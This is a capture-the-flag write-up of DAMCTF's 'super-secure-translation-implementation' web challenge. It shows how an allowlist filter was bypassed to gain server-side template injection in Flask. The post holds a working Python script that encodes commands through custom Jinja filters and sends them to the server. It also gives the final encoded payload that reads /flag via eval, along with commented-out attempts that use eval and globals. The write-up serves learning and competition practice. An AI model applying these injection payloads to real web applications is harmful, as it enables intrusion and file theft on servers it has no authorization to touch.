---
layout: post
title:  "[DAMCTF] super-secure-translation-implementation"
date:   "2021-11-07"
categories: [Web, Golf]
author: voidPtr
app_img: /assets/posts_images/super-secure-translation-implementation/app.PNG
check_img: /assets/posts_images/super-secure-translation-implementation/check.PNG
filters_img: /assets/posts_images/super-secure-translation-implementation/filters.PNG
payloadBase_img: /assets/posts_images/super-secure-translation-implementation/payloadBase.PNG
payloadFilter_img: /assets/posts_images/super-secure-translation-implementation/payloadFilter.PNG
---

The website show us the source code running on the site.  
<figure>
<img src="{{ page.app_img }}" alt="app.py">
</figure>

As we can see, it is possible to request any path as long as it exists and is in the same folder of app.py. 
Moreover, there's a path on the site, "/secure_translate/", where we can pass an argument "payload" and the server will extend the base code with our input. The perfet setup for a Server Side Template Injection.  
The problem is that our input is sanitized with a function "detect_remove_hacks". Looking at the import of this page, that function is in the file check.py. We can just request its source code in the path with "/check.py".  
<figure>
<img src="{{ page.check_img }}" alt="check.py">
</figure>

Here we can see that our input is restricted to a very limited set of characters, and to a given max lenght calculated from an external library ("rctf", imported in limit.py). An admin later told me that this limit is based on the first solve on th platform: in my case it was 161 chars. Painful.  

We need one more step before starting to build the payload: in app.py, before defining the routes, there are some custom filters added to the server for string manipulation as we can see in the comment above. Let's look at those functions in the file filters.py.
<figure>
<img src="{{ page.filters_img }}" alt="filters.py">
</figure>
There are some useful functions to convert a character in its ascii decimal notation and vice-versa, and a function that evaluates an input if it does not contain words from a blacklist, and if its initials 4 characters are not "open" or "eval".

First things first, let's try if we can make a simple template injection. Since we know we are on flask, let's try something that is not forbidden by the detect_remove_hacks() function, for example {%raw%}{{6*6}}{%endraw%}.
<figure>
<img src="{{ page.payloadBase_img }}" alt="payloadBase">
</figure>

Perfect, now we are sure that there's a way of making the server do what we want. The question is, how? We have only a bunch of chars to use, and there's not a payload using only that chars. My first answer was to try using ord() and chr() functions (python built-ins). But for some reason the server returns 500 if we try to use built-in functions inside the payload. So it came to my mind the custom filters implemented by filters.py. We can chain them to obtain another character starting from one of the allowed chars. For example, to obtain "a" we could do something like {%raw%}{{("b"|order-1)|ch}}{%endraw%}:
<figure>
<img src="{{ page.payloadFilter_img }}" alt="payloadFilter">
</figure>

Now that we know how to obtain an arbitrary character and that we can chain filters, my guess was to craft a payload and pass it to the e() function to evaluate it.
The problem now is the max lenght of the payload of 161 chars.
I wrote a python script to automate the translation of a char to its equivalent in the order|ch chain, and spent many time optimizing it to reduce the number of characters used. This was painful.  

Finally I came up with a payload, but it was of something like 174 chars. The ultimate "golf" of my code to reduce its length was to substitute the order part with its equivalent in number operations, using only the digits in the whitelist (otherwise we should translate them).
For example {%raw%}{{('l'|order+4)|ch}} == {{(111+1)|ch}} == "p"{%endraw%}.
I've done this manually because the time was almost finished and I didn't had time to automate it, but here's the script to obtain the payload until this last translation.
```python
import requests

TARGET_URL = 'https://super-secure-translation-implementation.chals.damctf.xyz'

previousNotEncoded = True

def findBestEncoding(c, l):
    resList = []
    for allowed in l:
        res = ""
        toAdd = ""
        sign = "+"
        
        toAdd = str(ord(c) - ord(allowed))
        if int(toAdd) < 0:
            sign = "-"
        if toAdd not in l:
            i = int(toAdd)
            if i == 2:
                toAdd = "1"+sign+"1"
            elif i == 3:
                tempSign = "-"
                if sign == "-":
                    tempSign = "+"
                toAdd = "4"+tempSign+"1"
            elif i == 5:
                toAdd = "4"+sign+"1"
            elif i == 7:
                toAdd = "1"+sign+"6"
            elif i == 8:
                toAdd = "4"+sign+"4"
            elif i == 9:
                toAdd = "4"+sign+"4"+sign+"1"
            else:
                toAdd1 = "1" + (sign+"1") * (abs(i)-1)
                atLeast4 = i // 4
                rest4 = i % 4
                toAdd4 = "4" + (sign+"4") * (abs(atLeast4)-1) + (sign+"1") * rest4
                atLeast6 = i // 6
                rest6 = i % 6
                toAdd6 = "6" + (sign+"6") * (abs(atLeast6)-1) + (sign+"1") * rest6
                if len(toAdd4) > len(toAdd6):
                    toAdd = toAdd6
                else:
                    toAdd = toAdd4
                if len(toAdd1) < len(toAdd):
                    toAdd = toAdd1
        res += "('"+allowed+"'|order"+ sign+toAdd+")|ch"
        resList.append(res)
    shortest = min(resList, key=len)
    return shortest


def codeStringEnhanced(s):
    global previousNotEncoded
    allowlist = [
        '"', "'", '(', ')', '{', '|', '}', '*', '+', '-', '1', '4', '6', 'b', 'c', 'd', 'e', 'h', 'l', 'o', 'r', 'u'
    ]
    res = ""
    for c in s:
        if res != "":
            if not previousNotEncoded:
                res += "+"
        if c in allowlist:
            if res == "":
                res += "'"
            if previousNotEncoded:
                res += c
            else:
                res += "'"+c
            previousNotEncoded = True
        else:
            if previousNotEncoded and res != "":
                res += "'+"
            res += findBestEncoding(c, allowlist)
            previousNotEncoded = False
    if previousNotEncoded:
        res += "'"
    res += ")"
    return res


# cmd = 'forbidlist[5]'
# cmd = '"".__class\__'
# cmd = '(eval("globals()[4]"))'
# cmd = '["b","d"]|map("u")'
# cmd = '''(eval("y('id')")'''
# cmd = 'globals()'
cmd = '(open("/flag").read())'
code = codeStringEnhanced(cmd)
payload = "{{"+code+"}}"
payload = payload.replace("'''", '"\'"')

# payloadF1 = "{{(" + code + "|e}}"
codeManual = ''''(o'+(66+44+1+1)|ch+'e'+(66+44)|ch+'("'+(44+1+1+1)|ch+(66+6*6)|ch+'l'+(4*4*6+1)|ch+(66+6*6+1)|ch+'")'+(46)|ch+'re'+(4*4*6+1)|ch+'d())')'''
payloadF1 = "{{(" + codeManual + "|e}}"
payloadF = payloadF1.replace("+", "%2B") # need this to avoid html/url errors
print(payloadF)
print(f"PAYLOAD LENGHT: {len(payloadF1)}")


r = requests.post(TARGET_URL+'/secure_translate/?payload='+payloadF)
print(f"RETURN CODE: {r.status_code}")

if(r.status_code == 200):
    text = r.text.split("<code>")[1].split("</code>")[0].split("<p>")[1].split("</p>")[0]
    text = text.strip()
    print("RESULT:")
    print(text)
else:
    print(r.text)
```
In the code above there are some commands I tried along the way ("cmd" variable).
The final payload is (open("/flag").read()). The external parenthesis are there to avoid the control in the e() filter. Its translations is:
```text
{%raw%}{{('(o'%2B(66%2B44%2B1%2B1)|ch%2B'e'%2B(66%2B44)|ch%2B'("'%2B(44%2B1%2B1%2B1)|ch%2B(66%2B6*6)|ch%2B'l'%2B(4*4*6%2B1)|ch%2B(66%2B6*6%2B1)|ch%2B'")'%2B(46)|ch%2B're'%2B(4*4*6%2B1)|ch%2B'd())')|e}}{%endraw%}
```
Its lenght is of 142 chars ("%2B" is translated in "+", so it is counted as a single char). Probably there are shorter payloads, but this has done the trick for me. 
Sending it to the server will give us our flag.

```
dam{p4infu1_all0wl1st_w3ll_don3}
```
